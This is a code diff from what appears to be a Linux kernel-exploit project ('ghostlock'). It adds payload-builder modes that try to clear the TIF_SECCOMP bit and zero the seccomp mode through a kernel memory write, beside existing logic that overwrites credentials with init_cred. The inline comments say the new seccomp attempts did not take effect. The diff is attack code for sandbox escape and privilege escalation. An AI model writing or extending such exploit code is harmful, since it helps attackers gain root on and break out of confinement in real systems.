@@ -1,4 +1,5 @@
 #include "memory/payload_builder.h"
+#include "kernel/target.h"
 
 #include <cstring>
 
@@ -62,7 +63,17 @@ namespace ghostlock::memory {
         };
         if (!request || request->mode == WriteMode::Disabled) return layout;
 
-        if (request->preserve_child) {
+        if (request->mode == WriteMode::SeccompFlags) {
+            /* W3 attempt: clear TIF_SECCOMP only. These values are not valid
+             * kernel pointers; the route returns success but the target is
+             * unchanged (verified: child stays Seccomp: 2). Kept to avoid the
+             * old zero-store panic; the final profile sets w3_attempts=0. */
+            layout.right = ~(1ULL << kernel::TIF_SECCOMP_BIT);
+        } else if (request->mode == WriteMode::SeccompMode) {
+            /* W3 attempt: mode = 0, filter_count = 1. Same value-path
+             * limitation as above. */
+            layout.right = 0x0000000100000000ULL;
+        } else if (request->preserve_child) {
             layout.right = request->mode == WriteMode::Credential
                                ? init_cred_alias
                                : page_base + 0x100;
